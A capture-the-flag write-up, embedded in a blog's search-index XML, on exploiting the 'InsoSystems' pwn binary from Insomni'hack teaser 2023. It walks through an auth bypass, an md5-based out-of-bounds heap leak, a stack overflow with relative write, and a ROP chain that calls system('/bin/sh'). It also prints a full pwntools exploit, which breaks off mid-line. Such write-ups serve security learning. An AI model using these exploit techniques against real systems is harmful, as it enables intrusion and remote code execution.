<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>INSOMNI’HACK TEASER 2023] INSOSYSTEMS - Tek</title>
      <link href="/2023/01/19/insosystems/"/>
      <url>/2023/01/19/insosystems/</url>
      
        <content type="html"><![CDATA[<p>InsoSystems was a pwn challenge from Insomni’hack teaser 2023.</p><h2 id="TL-DR"><a href="#TL-DR" class="headerlink" title="TL;DR"></a>TL;DR</h2><p>Leak the base address of the binary with an md5 out of bounds read. Exploit a<br>buffer overflow using ROP to leak the address of the libc then ret2main. And<br>finally re-exploit this buffer overflow to call <code>system</code> and get a shell.</p><p><img src="/insomnihack23/checksec.jpg" alt="checksec insosystems"></p><span id="more"></span><h1 id="Reverse-engineering"><a href="#Reverse-engineering" class="headerlink" title="Reverse-engineering"></a>Reverse-engineering</h1><p><img src="/insomnihack23/main.jpg" alt="The `main` function"></p><p>The binary first sets stdin&#x2F;stdout&#x2F;stderr as unbuffered. It then malloc a<br>function table containing 5 entries. And loop on getting an index from the user<br>input and call the corresponding function.</p><h2 id="auth"><a href="#auth" class="headerlink" title="auth"></a><code>auth</code></h2><p>Here is the <code>auth</code> function :</p><p><img src="/insomnihack23/auth.jpg" alt="IDA pseudocode of the `auth` function"></p><p>It offers two authentication methods : using the clear password, or using the<br>hash.<br>We don’t know the content of the environment variables <code>PASSWORD</code> and<br><code>PASSWORD_HASH</code> but since the function sets the global variable<br><code>g_is_logged_in</code> at the beginning, we can bypass the auth by providing an<br><code>auth_method</code> different from 1 and 2.</p><h2 id="is-logged-in"><a href="#is-logged-in" class="headerlink" title="is_logged_in"></a><code>is_logged_in</code></h2><p><img src="/insomnihack23/is_logged_in.jpg" alt="IDA pseudocode of the `is_logged_in` function"></p><p>This function just prints if we are logged in or not.</p><h2 id="upload-file"><a href="#upload-file" class="headerlink" title="upload_file"></a><code>upload_file</code></h2><p><img src="/insomnihack23/upload_file.jpg" alt="IDA pseudocode of the `upload_file` function"></p><p>There are two vulnerabilities in the function <code>upload_file</code>. The first one is an<br>out of bounds read : it computes the md5 sum of <code>filename_maxlen</code> bytes from the<br>buffer <code>filename</code>. <code>filename</code> is read from stdin in the function <code>read_buffer</code>. </p><p><img src="/insomnihack23/read_buffer.jpg" alt="IDA pseudocode of the `read_buffer` function"></p><p>As you can see <code>read_buffer</code> reads <strong>at most</strong> <code>max_size</code> bytes and allocates a<br>buffer of the effective size of the user input. So if <code>filename_maxlen</code> is<br>greater than the size of the provided buffer, we can leak the content of the<br>heap.<br>There is also a null byte overwrite but it will not be useful for us.</p><p>The second vulnerability in this function is a buffer overflow, during the call<br>to <code>read_file_content</code>.</p><p><img src="/insomnihack23/read_file_content.jpg" alt="IDA pseudocode of the `read_file_content` function"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">file_s</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">char</span> content[<span class="number">4096</span>];</span><br><span class="line">  <span class="type">int</span> size;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>This function reads at most <code>maxsize + 999</code> bytes from stdin into<br><code>file-&gt;content</code> without taking into account the size of <code>file-&gt;content</code> which is<br>always 4096. Moreover, <code>file-&gt;size</code> is placed just after <code>file-&gt;content</code> so we<br>can overwrite it to get a relative write primitive as we control <code>file-&gt;size</code><br>during the <code>memcpy</code>.</p><h2 id="read-file"><a href="#read-file" class="headerlink" title="read_file"></a><code>read_file</code></h2><p><img src="/insomnihack23/read_file.jpg" alt="IDA pseudocode of the `read_file` function"></p><p>Here we have the same vulnerability as in <code>upload_file</code> with the md5 sum, but is<br>harder to exploit because if the file does not exists the program exits with the<br>error message <code>Error reading file</code>.</p><h1 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h1><h2 id="Leak-exe-base-address"><a href="#Leak-exe-base-address" class="headerlink" title="Leak exe base address"></a>Leak exe base address</h2><p>The binary is compiled with all the protections enabled.</p><p>I started to exploit the oob read to get some leaks from the heap.<br>Remember the <code>upload_file</code> function.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">filename_maxlen = read_int(fd);</span><br><span class="line"><span class="keyword">if</span> ( filename_maxlen &lt;= <span class="number">0</span> )</span><br><span class="line">exit_error(<span class="string">&quot;Couldn&#x27;t read file name size&quot;</span>);</span><br><span class="line">filename = read_buffer(fd, filename_maxlen);</span><br><span class="line"><span class="built_in">memset</span>(filename_hash, <span class="number">0</span>, <span class="number">0x21</span>uLL);</span><br><span class="line">md5_hex(filename, filename_maxlen, filename_hash);<span class="comment">// oob read</span></span><br></pre></td></tr></table></figure><p>If we provide a “big” integer as <code>filename_maxlen</code> (e.g. 0x28) but a small<br>buffer such as <code>abcd</code> the <code>md5_hex</code> function will read 0x28 bytes from heap and<br>produce a hash with them while the actual allocated buffer has a size of 0x5<br>(realloc allocated a chunk of 0x18 available bytes).</p><p>Here is the heap layout just before the call to <code>md5_hex</code>. <code>rdi</code> is <code>filename</code>.</p><p><img src="/insomnihack23/oob.jpg" alt="Heap layout before `md5_hex`"></p><p>So we can leak the base address of the binary one byte a time starting by<br>reading 0x28 bytes, then 0x27 and so on until 0x20 bytes. We start by reading<br>0x28 bytes because of the null byte overwrite at the end of the <code>read_buffer</code><br>function. Each read will produce a hash, the path of the file. With 8 hashes we<br>just have to bruteforce one byte per hash.  </p><p>There follows the exploit code for the leak :</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">&quot; leak exe</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">hashes = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    path = upload(<span class="number">0x20</span> + <span class="number">8</span> - i, <span class="string">b&quot;abcd&quot;</span>, <span class="number">1</span>, <span class="string">b&quot;x&quot;</span>)</span><br><span class="line">    hashes.append(path)</span><br><span class="line"></span><br><span class="line">leak = <span class="string">b&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> target <span class="keyword">in</span> hashes[::-<span class="number">1</span>]:</span><br><span class="line">    <span class="keyword">for</span> bf <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x100</span>):</span><br><span class="line">        b = <span class="built_in">bytes</span>([bf])</span><br><span class="line">        h = hashlib.md5()</span><br><span class="line">        h.update(<span class="string">b&quot;abcd&quot;</span>.ljust(<span class="number">0x18</span>, <span class="string">b&quot;\x00&quot;</span>) + p64(<span class="number">0x21</span>) + leak + b)</span><br><span class="line">        <span class="keyword">if</span> target == h.hexdigest().encode():</span><br><span class="line">            leak += <span class="built_in">bytes</span>([bf])</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">exe.address = u64(leak) - <span class="number">0x142b</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;exe @ <span class="subst">&#123;<span class="built_in">hex</span>(exe.address)&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><h2 id="Leak-libc-base-address-and-pop-a-shell"><a href="#Leak-libc-base-address-and-pop-a-shell" class="headerlink" title="Leak libc base address and pop a shell !"></a>Leak libc base address and pop a shell !</h2><p>We now have the base address of the binary. We also found a stack-based buffer<br>overflow. Let’s exploit it to control <code>rip</code>.</p><p>The vulnerability is in <code>read_file_content</code> it allows us to write a buffer of<br>the size of our choice on the stack.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="keyword">sizeof</span>(s));</span><br><span class="line">  v4 = read(<span class="number">0</span>, s, <span class="number">1000uLL</span>);</span><br><span class="line">  <span class="comment">// no check on maxsize</span></span><br><span class="line">  <span class="comment">// if maxsize &gt; 4096 -&gt; stack buffer overflow</span></span><br><span class="line">  <span class="comment">// -&gt; we can overwrite file-&gt;size which is just after file-&gt;content</span></span><br><span class="line">  <span class="built_in">memcpy</span>(&amp;file-&gt;content[file-&gt;size], s, v4);</span><br><span class="line">  file-&gt;size += v4;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span> ( v4 &gt; <span class="number">0</span> &amp;&amp; maxsize &gt; file-&gt;size );</span><br></pre></td></tr></table></figure><p><code>file</code> is defined as is :</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">file_s</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">char</span> content[<span class="number">4096</span>];</span><br><span class="line">  <span class="type">int</span> size;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>We have to send 4096 bytes then the offset (positive or negative :) ) of our<br>desired write, then pause, so that <code>read</code> will return and <code>file-&gt;size</code> gets<br>overwritten. And finally send our payload.</p><p><img src="/insomnihack23/buffer_overflow.jpg" alt="Saved `rip` before `memcpy`"></p><p>As seen in gdb, at the time of the <code>memcpy</code> the current frame saved <code>rip</code> is<br>located 0x38 bytes before our buffer. We have to overwrite <code>file-&gt;size</code> with<br>-0x38, then send our new <code>rip</code> value and fill the buffer until <code>file-&gt;size</code> and<br>overwrite it with a big value to exit the do-while :</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">rel_write</span>(<span class="params">offset, data, pwned=<span class="literal">False</span></span>):</span><br><span class="line">    <span class="keyword">if</span> offset &lt; <span class="number">0</span>:</span><br><span class="line">        r.send(f([UPLOAD,</span><br><span class="line">                  <span class="built_in">len</span>(<span class="string">&quot;write&quot;</span>),</span><br><span class="line">                  <span class="string">b&quot;write&quot;</span>,</span><br><span class="line">                  <span class="number">0x1004</span>])</span><br><span class="line">               + <span class="string">b&quot;A&quot;</span>*<span class="number">0x1000</span> + p32(offset - (<span class="number">0x1004</span> % <span class="number">1000</span>), sign=<span class="string">&quot;signed&quot;</span>))</span><br><span class="line">        pause()</span><br><span class="line">        r.send(data.ljust(<span class="number">0x1000</span> - offset, <span class="string">b&quot;A&quot;</span>) + p32(<span class="number">0x133700</span>)) <span class="comment"># big value</span></span><br><span class="line">        pause()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        r.send(f([UPLOAD,</span><br><span class="line">                  <span class="built_in">len</span>(<span class="string">&quot;write&quot;</span>),</span><br><span class="line">                  <span class="string">b&quot;write&quot;</span>,</span><br><span class="line">                  offset + <span class="built_in">len</span>(data)])</span><br><span class="line">               + <span class="string">b&quot;A&quot;</span>*<span class="number">0x1000</span> + p32(offset - (<span class="number">0x1004</span> % <span class="number">1000</span>), sign=<span class="string">&quot;signed&quot;</span>))</span><br><span class="line">        pause() </span><br><span class="line">        r.send(data)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> pwned:</span><br><span class="line">        msg = recv_msg()</span><br><span class="line">        <span class="keyword">return</span> msg[<span class="string">&quot;data&quot;</span>]</span><br></pre></td></tr></table></figure><p>Once we control <code>rip</code> we can ROP to leak the libc base address, then ret2main,<br>and pop a shell.</p><p>I leaked the value of <code>free</code> in the GOT the get the libc base address.</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">&quot; rop</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">exe_info = exe.address + <span class="number">0xe27</span></span><br><span class="line">exe_main = exe.address + <span class="number">0x1a33</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;bss @ <span class="subst">&#123;<span class="built_in">hex</span>(exe.bss())&#125;</span>&quot;</span>)</span><br><span class="line">rop = ROP(exe)</span><br><span class="line">rop.raw(rop.find_gadget([<span class="string">&quot;ret&quot;</span>])) <span class="comment"># movaps issue</span></span><br><span class="line">rop.call(exe_info, [exe.got[<span class="string">&quot;free&quot;</span>]])</span><br><span class="line">rop.call(exe_main)</span><br><span class="line"></span><br><span class="line">leak = rel_write(-<span class="number">0x38</span>, rop.chain())</span><br><span class="line">leak = u64(leak.ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;free @ <span class="subst">&#123;<span class="built_in">hex</span>(leak)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">libc.address = leak - libc.sym[<span class="string">&quot;free&quot;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;libc @ <span class="subst">&#123;<span class="built_in">hex</span>(libc.address)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">rop = ROP(libc)</span><br><span class="line">rop.call(<span class="string">&quot;system&quot;</span>, [<span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh\x00&quot;</span>))])</span><br><span class="line">rel_write(-<span class="number">0x38</span>, rop.chain(), pwned=<span class="literal">True</span>)</span><br><span class="line"><span class="comment"># rel_write(0x1078, rop.chain(), pwned=True)</span></span><br></pre></td></tr></table></figure><p>Note that I also tried to overwrite the return address of the <code>upload_file</code><br>function at the offset 0x1078, it worked on local but not on the remote<br>challenge :&#x2F;<br>Bonus: I managed to leak a stack address with a bit of bruteforce (1&#x2F;32)<br>by overwriting the null byte at the end of <code>filename_hash</code> using the relative<br>write but it was not useful for our exploit.</p><h1 id="Appendix"><a href="#Appendix" class="headerlink" title="Appendix"></a>Appendix</h1><p>The full exploit :</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">VERBOSE = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">exe = ELF(<span class="string">&quot;./insosystems&quot;</span>)</span><br><span class="line"></span><br><span class="line">libc = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> args.REMOTE:</span><br><span class="line">    <span class="comment"># libc = ELF(&quot;./libc.so&quot;)</span></span><br><span class="line">    libc = ELF(<span class="string">&quot;docker/libc.so.6&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    libc = ELF(<span class="string">&quot;/path/to/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line">context.binary = exe</span><br><span class="line">context.terminal = [<span class="string">&quot;tmux&quot;</span>, <span class="string">&quot;new-window&quot;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">conn</span>():</span><br><span class="line">    <span class="keyword">if</span> args.REMOTE:</span><br><span class="line">        r = remote(<span class="string">&quot;insosystems.insomnihack.ch&quot;</span>, <span class="number">31337</span>)</span><br><span class="line">        <span class="comment"># r = remote(&quot;127.0.0.1&quot;, 31337)</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        r = process([exe.path])</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> r</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">attach_gdb</span>():</span><br><span class="line">    <span class="keyword">if</span> args.GDB:</span><br><span class="line">        gdb.attach(r, gdbscript=<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">source ~/.gdbinit-gef.py</span></span><br><span class="line"><span class="string">pie break 0x13bf</span></span><br><span class="line"><span class="string">c</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">AUTH = <span class="number">0</span></span><br><span class="line">IS_LOGGED = <span class="number">1</span></span><br><span class="line">UPLOAD = <span class="number">2</span></span><br><span class="line">READ_FILE = <span class="number">3</span></span><br><span class="line">EXIT = <span class="number">4</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pause</span>():</span><br><span class="line">    <span class="keyword">if</span> args.GDB:</span><br><span class="line">        <span class="built_in">input</span>(<span class="string">&quot;pause&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        time.sleep(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">f</span>(<span class="params">data</span>):</span><br><span class="line">    ret = <span class="string">b&quot;|&quot;</span></span><br><span class="line">    <span class="keyword">for</span> f <span class="keyword">in</span> data:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(f, <span class="built_in">bytes</span>):</span><br><span class="line">            ret += f</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            ret += <span class="built_in">str</span>(f).encode()</span><br><span class="line">        ret += <span class="string">b&quot;|&quot;</span></span><br><span class="line">    <span class="keyword">return</span> ret</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">recv_msg</span>():</span><br><span class="line">    r.recvuntil(<span class="string">b&quot;|&quot;</span>)</span><br><span class="line">    code = <span class="built_in">int</span>(r.recvuntil(<span class="string">b&quot;|&quot;</span>, drop=<span class="literal">True</span>))</span><br><span class="line">    size = <span class="built_in">int</span>(r.recvuntil(<span class="string">b&quot;|&quot;</span>, drop=<span class="literal">True</span>))</span><br><span class="line">    data = r.recv(size)</span><br><span class="line">    r.recvuntil(<span class="string">b&quot;|&quot;</span>)</span><br><span class="line">    ret = &#123;<span class="string">&quot;code&quot;</span>:code, <span class="string">&quot;size&quot;</span>:size, <span class="string">&quot;data&quot;</span>:data&#125;</span><br><span class="line">    <span class="keyword">if</span> VERBOSE: <span class="built_in">print</span>(ret)</span><br><span class="line">    <span class="keyword">return</span> ret</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">auth</span>():</span><br><span class="line">    r.send(f([AUTH, <span class="number">3</span>]))</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_logged</span>():</span><br><span class="line">    r.send(f([IS_LOGGED]))</span><br><span class="line">    <span class="keyword">return</span> recv_msg()[<span class="string">&quot;data&quot;</span>] == <span class="string">b&quot;You are logged in&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload</span>(<span class="params">filename_len, filename, size, data</span>):</span><br><span class="line">    r.send(f([UPLOAD, filename_len, filename, size]) + data)</span><br><span class="line">    <span class="keyword">return</span> recv_msg()[<span class="string">&quot;data&quot;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_file</span>(<span class="params">filename</span>):</span><br><span class="line">    r.send(f([READ_FILE, <span class="built_in">len</span>(filename), filename]))</span><br><span class="line">    <span class="keyword">return</span> recv_msg()[<span class="string">&quot;data&quot;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rel_write</span>(<span class="params">offset, data, pwned=<span class="literal">False</span></span>):</span><br><span class="line">    <span class="keyword">if</span> offset &lt; <span class="number">0</span>:</span><br><span class="line">        r.send(f([UPLOAD,</span><br><span class="line">                  <span class="built_in">len</span>(<span class="string">&quot;write&quot;</span>),</span><br><span class="line">                  <span class="string">b&quot;write&quot;</span>,</span><br><span class="line">                  <span class="number">0x1004</span>])</span><br><span class="line">               + <span class="string">b&quot;A&quot;</span>*<span class="number">0x1000</span> + p32(offset - (<span class="number">0x1004</span> % <span class="number">1000</span>), sign=<span class="string">&quot;signed&quot;</span>))</span><br><span class="line">        pause()</span><br><span class="line">        r.send(data.ljust(<span class="number">0x1000</span> - offset, <span class="string">b&quot;A&quot;</span>) + p32(<span class="number">0x133700</span>)) <span class="comment"># big value</span></span><br><span class="line">        pause()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        r.send(f([UPLOAD,</span><br><span class="line">                  <span class="built_in">len</span>(<span class="string">&quot;write&quot;</span>),</span><br><span class="line">                  <span class="string">b&quot;write&quot;</span>,</span><br><span class="line">                  offset + <span class="built_in">len</span>(data)])</span><br><span class="line">               + <span class="string">b&quot;A&quot;</span>*<span class="number">0x1000</span> + p32(offset - (<span class="number">0x1004</span> % <span class="number">1000</span>), sign=<span class="string">&quot;signed&quot;</span>))</span><br><span class="line">        pause() </span><br><span class="line">        r.send(data)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> pwned:</span><br><span class="line">        msg = recv_msg()</span><br><span class="line">        <span class="keyword">return</span> msg[<span class="string">&quot;data&quot;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="keyword">global</span> r</span><br><span class="line"></span><br><span class="line">    r = conn()</span><br><span class="line">    attach_gdb()</span><br><span class="line"></span><br><span class="line">    auth()</span><br><span class="line">    <span class="keyword">assert</span> is_logged()</span><br><span class="line">    upload(<span class="number">4</span>, <span class="string">b&quot;toto&quot;</span>, <span class="number">4</span>, <span class="string">b&quot;hey&quot;</span>)</span><br><span class="line">    read_file(<span class="string">b&quot;toto&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    &quot; leak exe</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    hashes = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        path = upload(<span class="number">0x20</span> + <span class="number">8</span> - i, <span class="string">b&quot;abcd&quot;</span>, <span class="number">1</span>, <span class="string">b&quot;x&quot;</span>)</span><br><span class="line">        hashes.append(path)</span><br><span class="line"></span><br><span class="line">    leak = <span class="string">b&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> target <span class="keyword">in</span> hashes[::-<span class="number">1</span>]:</span><br><span class="line">        <span class="keyword">for</span> bf <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x100</span>):</span><br><span class="line">            b = <span class="built_in">bytes</span>([bf])</span><br><span class="line">            h = hashlib.md5()</span><br><span class="line">            h.update(<span class="string">b&quot;abcd&quot;</span>.ljust(<span class="number">0x18</span>, <span class="string">b&quot;\x00&quot;</span>) + p64(<span class="number">0x21</span>) + leak + b)</span><br><span class="line">            <span class="keyword">if</span> target == h.hexdigest().encode():</span><br><span class="line">                leak += <span class="built_in">bytes</span>([bf])</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    exe.address = u64(leak) - <span class="number">0x142b</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;exe @ <span class="subst">&#123;<span class="built_in">hex</span>(exe.address)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    &quot; rop</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    exe_info = exe.address + <span class="number">0xe27</span></span><br><span class="line">    exe_main = exe.address + <span class="number">0x1a33</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span 